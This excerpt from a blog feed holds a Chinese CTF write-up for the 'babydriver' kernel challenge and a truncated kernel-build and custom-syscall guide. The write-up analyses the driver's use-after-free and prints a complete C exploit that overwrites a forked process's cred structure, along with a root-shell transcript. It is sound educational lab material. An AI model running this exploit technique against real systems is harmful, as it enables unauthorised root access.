class="line">usr/bin/flock</span><br><span class="line">usr/bin/unexpand</span><br><span class="line">usr/bin/man</span><br><span class="line">usr/bin/realpath</span><br><span class="line">usr/bin/uniq</span><br><span class="line">usr/bin/tcpsvd</span><br><span class="line">usr/bin/udpsvd</span><br><span class="line">usr/bin/users</span><br><span class="line">usr/bin/nc</span><br><span class="line">usr/bin/lzma</span><br><span class="line">usr/bin/microcom</span><br><span class="line">usr/bin/free</span><br><span class="line">usr/bin/logger</span><br><span class="line">usr/bin/install</span><br><span class="line">usr/bin/readlink</span><br><span class="line">usr/bin/setuidgid</span><br><span class="line">usr/bin/telnet</span><br><span class="line">usr/bin/diff</span><br><span class="line">usr/bin/fuser</span><br><span class="line">usr/bin/tr</span><br><span class="line">usr/bin/cut</span><br><span class="line">usr/bin/sha3sum</span><br><span class="line">usr/bin/split</span><br><span class="line">usr/bin/unix2dos</span><br><span class="line">usr/bin/[</span><br><span class="line">usr/bin/setsid</span><br><span class="line">usr/bin/[[</span><br><span class="line">usr/bin/volname</span><br><span class="line">usr/bin/cmp</span><br><span class="line">usr/bin/cryptpw</span><br><span class="line">usr/bin/sha512sum</span><br><span class="line">usr/bin/softlimit</span><br><span class="line">usr/bin/killall</span><br><span class="line">usr/bin/showkey</span><br><span class="line">usr/bin/mkpasswd</span><br><span class="line">usr/bin/chpst</span><br><span class="line">usr/bin/sum</span><br><span class="line">usr/bin/mkfifo</span><br><span class="line">usr/bin/ttysize</span><br><span class="line">usr/bin/tftp</span><br><span class="line">usr/bin/yes</span><br><span class="line">usr/bin/pkill</span><br><span class="line">usr/bin/wget</span><br><span class="line">usr/bin/xz</span><br><span class="line">usr/bin/du</span><br><span class="line">usr/bin/lpq</span><br><span class="line">usr/bin/who</span><br><span class="line">usr/bin/rx</span><br><span class="line">usr/bin/dc</span><br><span class="line">usr/bin/nslookup</span><br><span class="line">usr/bin/fgconsole</span><br><span class="line">usr/bin/lsusb</span><br><span class="line">usr/bin/dpkg</span><br><span class="line">usr/bin/vlock</span><br><span class="line">usr/bin/chrt</span><br><span class="line">usr/bin/chvt</span><br><span class="line">usr/bin/wall</span><br><span class="line">usr/bin/beep</span><br><span class="line">usr/bin/seq</span><br><span class="line">usr/bin/time</span><br><span class="line">usr/bin/lspci</span><br><span class="line">usr/bin/xargs</span><br><span class="line">usr/bin/crontab</span><br><span class="line">usr/sbin</span><br><span class="line">usr/sbin/ubirsvol</span><br><span class="line">usr/sbin/crond</span><br><span class="line">usr/sbin/inetd</span><br><span class="line">usr/sbin/i2cdump</span><br><span class="line">usr/sbin/nandwrite</span><br><span class="line">usr/sbin/addgroup</span><br><span class="line">usr/sbin/ntpd</span><br><span class="line">usr/sbin/deluser</span><br><span class="line">usr/sbin/ubiupdatevol</span><br><span class="line">usr/sbin/killall5</span><br><span class="line">usr/sbin/ubidetach</span><br><span class="line">usr/sbin/chroot</span><br><span class="line">usr/sbin/httpd</span><br><span class="line">usr/sbin/nbd-client</span><br><span class="line">usr/sbin/fakeidentd</span><br><span class="line">usr/sbin/adduser</span><br><span class="line">usr/sbin/brctl</span><br><span class="line">usr/sbin/readprofile</span><br><span class="line">usr/sbin/ubirmvol</span><br><span class="line">usr/sbin/tftpd</span><br><span class="line">usr/sbin/rtcwake</span><br><span class="line">usr/sbin/fdformat</span><br><span class="line">usr/sbin/chat</span><br><span class="line">usr/sbin/ubirename</span><br><span class="line">usr/sbin/udhcpd</span><br><span class="line">usr/sbin/sendmail</span><br><span class="line">usr/sbin/arping</span><br><span class="line">usr/sbin/ifplugd</span><br><span class="line">usr/sbin/nanddump</span><br><span class="line">usr/sbin/svlogd</span><br><span class="line">usr/sbin/i2cset</span><br><span class="line">usr/sbin/chpasswd</span><br><span class="line">usr/sbin/readahead</span><br><span class="line">usr/sbin/fbset</span><br><span class="line">usr/sbin/popmaildir</span><br><span class="line">usr/sbin/dhcprelay</span><br><span class="line">usr/sbin/ubimkvol</span><br><span class="line">usr/sbin/delgroup</span><br><span class="line">usr/sbin/setfont</span><br><span class="line">usr/sbin/ftpd</span><br><span class="line">usr/sbin/telnetd</span><br><span class="line">usr/sbin/i2cdetect</span><br><span class="line">usr/sbin/lpd</span><br><span class="line">usr/sbin/remove-shell</span><br><span class="line">usr/sbin/setlogcons</span><br><span class="line">usr/sbin/rdate</span><br><span class="line">usr/sbin/i2cget</span><br><span class="line">usr/sbin/add-shell</span><br><span class="line">usr/sbin/dnsd</span><br><span class="line">usr/sbin/loadfont</span><br><span class="line">usr/sbin/powertop</span><br><span class="line">usr/sbin/ubiattach</span><br><span class="line">usr/sbin/rdev</span><br><span class="line">usr/sbin/ether-wake</span><br><span class="line">tmp</span><br><span class="line">linuxrc</span><br><span class="line">home</span><br><span class="line">home/ctf</span><br><span class="line">5556 blocks</span><br><span class="line">➜  core ls</span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr</span><br><span class="line">➜  core bat init</span><br><span class="line">───────┬────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │  </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ chown root:root flag</span><br><span class="line">   7   │ chmod 400 flag</span><br><span class="line">   8   │ <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">   9   │ <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">  10   │ <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">  11   │</span><br><span class="line">  12   │ insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">  13   │ chmod 777 /dev/babydev</span><br><span class="line">  14   │ <span class="built_in">echo</span> -e <span class="string">&quot;\nBoot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span></span><br><span class="line">  15   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  16   │</span><br><span class="line">  17   │ umount /proc</span><br><span class="line">  18   │ umount /sys</span><br><span class="line">  19   │ poweroff -d 0  -f</span><br><span class="line">  20   │</span><br><span class="line">───────┴────────────────────────────────────────────────────────────────────────</span><br><span class="line">➜  core</span><br></pre></td></tr></table></figure><p>根据init内容,12行加载了<code>babydriver.ko</code>这个驱动,根据pwn的一般套路,这个就是有漏洞的LKM。init的其他命令都是linux常用命令。</p><p>将驱动文件提取出来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  core cp ./lib/modules/4.4.72/babydriver.ko ..</span><br><span class="line">➜  core <span class="built_in">cd</span> ..</span><br><span class="line">➜  babydriver checksec babydriver.ko</span><br><span class="line">[*] <span class="string">&#x27;/home/lantern/Desktop/kernel/babydriver/babydriver.ko&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">➜  babydriver file babydriver.ko</span><br><span class="line">babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>没有开PIE, 无canary保护,没有去除符号表</p><p>IDA打开,由于没有除去符号表,因此可以先<code>shift + F9</code>看看有什么结构体, 可以发现如下结构体:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure><p>而主要函数有:</p><ul><li>babyrelease</li><li>babyopen</li><li>babyioctl</li><li>babywrite</li><li>babyread</li><li>babydriver_init</li><li>babydriver_exit</li></ul><p>其中, <code>babydriver_init</code>和<code>babydriver_exit</code>分别完成了<code>/dev/babydev</code>设备的初始化和清理, <code>babyrelease</code>用于释放空间。</p><p><strong>babyioctl</strong>:定义了 0x10001 命令, 可以释放全局变量babydev_struct中的device_buf,再根据用户传递的 size 重新申请一块内存,并设置 device_buf_len。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyopen</strong>: 申请一块空间, 大小为 0x40 字节, 地址存储在全局变量 <code>babydev_struct.device_buf</code>上,并更新 <code>babydev_struct.device_buf_len</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babyread</strong>: 先检查长度是否小于 <code>babydev_struct.device_buf_len</code>, 然后把 <code>babydev_struct.device_buf</code> 中的数据拷贝到 <code>buff</code>中, <code>buff</code>和长度都是用户传递的数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>babywrite</strong>: 类似 <code>babyread</code>, 不同的是从buff拷贝到全局变量中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>存在一个<strong>伪条件竞争引发的UAF漏洞</strong>,即当我们同时打开两个设备,第二次会覆盖第一次分配的空间,因为<code>babydev_struct</code>是全局的。同样,如果释放第一个,那么第二个其实是被释放过的,这样就造成了一个UAF,我们可以通过UAF修改<code>cred</code>结构体来提权。</p><p>其中 <code>4.4.72</code>的<code>cred</code>结构体定义如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>则根据<code>UAF</code>的思想:</p><ol><li>打开两次设备,通过 <code>ioctl</code> 更改其大小为 cred 结构体的大小</li><li>释放其中一个, fork 一个新的进程, 那么这个新进程的 cred 的空间就会和之前释放的空间重叠</li><li>同时,我们可以通过另一个文件描述符对这块空间写,只需要将<code>uid</code>和<code>gid</code>改为0,即可实现提权到<code>root</code></li></ol><p>需要确定<code>cred</code>结构体的大小,大小为<code>0xa8(4.4.72)</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2,修改新进程的 cred 的 uid,gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="get-root-shell"><a href="#get-root-shell" class="headerlink" title="get root shell"></a>get root shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 静态编译文件,kernel 中没有 libc</span><br><span class="line">➜  gcc exploit.c -static -o exploit</span><br><span class="line">➜  file exploit</span><br><span class="line">exploit: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped</span><br><span class="line">// 把编译好的 exp 解压后的目录下,重新打包 rootfs.cpio</span><br><span class="line">➜  cp exploit core/tmp</span><br><span class="line">➜  <span class="built_in">cd</span> core</span><br><span class="line">➜  find . | cpio -o --format=newc &gt; rootfs.cpio</span><br><span class="line">7017 块</span><br><span class="line">➜  cp rootfs.cpio ..</span><br><span class="line">➜  <span class="built_in">cd</span> ..</span><br><span class="line">// kvm 需要有 root 权限</span><br><span class="line">➜  sudo zsh boot.sh</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">/ $ ls /tmp/</span><br><span class="line">exploit</span><br><span class="line">/ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">/ $ /tmp/exploit</span><br><span class="line">[   14.376187] device open</span><br><span class="line">[   14.376715] device open</span><br><span class="line">[   14.377201] alloc <span class="keyword">done</span></span><br><span class="line">[   14.377629] device release</span><br><span class="line">[+] root now.</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel 环境配置及调试</title>
      <link href="/note-pwn-kernel-environment/"/>
      <url>/note-pwn-kernel-environment/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>2020.8.21 添加一个遇到的问题以及解决; 修改 start.sh;</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>Windows10 v2004</li><li>VMware15.6 Pro</li><li>Ubuntu18.04 LTS 虚拟机</li></ul><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>kernel 源码下载: <code>https://www.kernel.org/</code></p><p>按需下载版本即可,这里我用的是<code>linux-5.7.8</code></p><p>安装必要依赖</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc</span><br></pre></td></tr></table></figure><p>解压源码后进入目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>配置选项</p><ol><li>进入kernel hacking</li><li>勾选Kernel debugging</li><li>Compile-time checks and compiler options -&gt; Compile the kernel with debug info 和 Compile the kernel with frame pointers</li><li>KGDB</li></ol><p>保存退出。不过这些选项默认是已选的。</p><p>接着<code>make bzImage -j8</code>进行编译,<code>-j</code>表示多线程编译,<code>8</code>即8个线程,</p><p>出现以下信息表示编译OK</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setup is 15228 bytes (padded to 15360 bytes).</span><br><span class="line">System is 8888 kB</span><br><span class="line">CRC 2c515b81</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure><ul><li>从<code>./arch/x86/boot/bzImage</code>拿到<code>bzImage</code></li><li>从源码根目录拿到<code>vmlinux</code></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p><a href="https://lantern.cool/note-pwn-kernel-compilation-problem">Linux 编译内核问题汇总</a></p><h2 id="添加自定-syscall"><a href="#添加自定-syscall" class="headerlink" title="添加自定 syscall"></a>添加自定 syscall</h2><p>在源码根目录创建一个新的目录（模块），以经典的<code>helloworld</code>为例。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-5.1.7 <span class="built_in">cd</span> helloworld/</span><br><span class="line">➜  helloworld <span class="built_in">cd</span> tree</span><br><span class="line">.</span><br><span class="line">├── helloworld.c</span><br><span class="line">└── Makefile</span><br><span class="line"></span><br><span class="line">0 directories, 2 files</span><br><span class="line">➜  helloworld bat helloworld.c</span><br><span class="line">───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: helloworld.c</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line">   2   │</span><br><span class="line">   3   │ asmlinkage long sys_helloworld(void)&#123;</span><br><span class="line">   4   │     printk(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">   5   │     <span class="built_in">return</span> 0;</span><br><span class="line">   6   │ &#125;</span><br><span class="line">───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">➜  helloworld bat Makefile</span><br><span class="line">───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: Makefile</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ obj-y=helloworld.o</span><br><span class="line">───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>编辑源码根目录下的<code>Makefile</code>,加入<code>helloworld</code>模块。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">PHONY += prepare0</span><br><span class="line"></span><br><span class="line">ifeq ($(KBUILD_EXTMOD),)</span><br><span class="line">core-y      += kernel/ certs/ mm/ fs/ ipc/ security/ crypto/ block/ helloworld/</span><br><span class="line"></span><br><span class="line">vmlinux-dirs    := $(patsubst %/,%,$(filter %/, $(init-y) $(init-m) \</span><br><span class="line">             $(core-y) $(core-m) $(drivers-y) $(drivers-m) \</span><br><span class="line">             $(net-y) $(net-m) $(libs-y) $(libs-m) $(virt-y)))</span><br><span class="line"></span><br><span class="line">vmlinux-alldirs := $(sort $(vmlinux-dirs) $(patsubst %/,%,$(filter %/, \</span><br><span class="line">             $(init-) $(core-) $(drivers-) $(net-) $(libs-) $(virt-))))</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后编辑<code>include/linux/syscalls.h</code>，添加<code>helloworld</code>函数原型。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_helloworld</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>添加到文件末尾即可</p><p>再修改<code>arch/x86/entry/syscalls/syscall_32.tbl</code>和<code>arch/x86/entry/syscalls/syscall_64.tbl</code>, 添加自定义的系统调用号。</p><ul><li><strong>i386</strong>: <code>1000    i386    helloworld  sys_helloworld</code></li><li><strong>amd64</strong>: <code>1000    common helloworld 